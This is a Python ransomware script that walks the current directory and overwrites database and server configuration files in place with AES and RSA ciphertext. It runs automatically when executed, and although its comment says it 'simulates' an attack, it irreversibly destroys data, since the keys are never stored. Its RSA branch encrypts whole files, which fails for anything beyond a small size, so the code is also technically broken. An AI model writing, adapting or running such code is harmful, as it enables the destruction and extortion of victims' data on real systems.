import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding

# Define file types commonly associated with databases and servers
database_file_types = ['.sql', '.db', '.mdb', '.sqlite']
server_file_types = ['.log', '.config', '.xml', '.ini', '.php', '.json', '.yaml', '.yml']

# AES Encryption for database files
def encrypt_database_file(file_path, aes_key):
    # Read the file data
    with open(file_path, "rb") as f:
        file_data = f.read()

    # Generate a random Initialization Vector (IV)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Pad the data to match the AES block size (128 bits)
    padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(file_data) + padder.finalize()

    # Encrypt the data
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Overwrite the original file with the encrypted data
    with open(file_path, "wb") as f:
        f.write(iv + encrypted_data)  # Prepend IV to the encrypted data

    print(f"Database file encrypted: {file_path}")

# RSA Encryption for server files
def encrypt_server_file(file_path, public_key):
    # Read the file data
    with open(file_path, "rb") as f:
        file_data = f.read()

    # Encrypt the file data using RSA
    encrypted_data = public_key.encrypt(
        file_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Overwrite the original file with the encrypted data
    with open(file_path, "wb") as f:
        f.write(encrypted_data)

    print(f"Server file encrypted: {file_path}")

# Function to simulate ransomware attack
def ransomware_attack(starting_directory):
    # Generate AES key for database files (256-bit)
    aes_key = os.urandom(32)

    # Generate RSA key pair for server files
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()

    # Scan for target database and server files
    database_files = scan_for_target_files(starting_directory, database_file_types)
    server_files = scan_for_target_files(starting_directory, server_file_types)

    # Encrypt database files using AES
    for file in database_files:
        encrypt_database_file(file, aes_key)

    # Encrypt server files using RSA
    for file in server_files:
        encrypt_server_file(file, public_key)

# Scan for target files in the directory
def scan_for_target_files(starting_directory, target_file_types):
    target_files = []
    for root, dirs, files in os.walk(starting_directory):
        for file in files:
            if any(file.endswith(ext) for ext in target_file_types):
                file_path = os.path.join(root, file)
                target_files.append(file_path)
    return target_files

# Example usage: Start ransomware attack from the current directory
starting_directory = '.'  # Adjust this as needed
ransomware_attack(starting_directory)
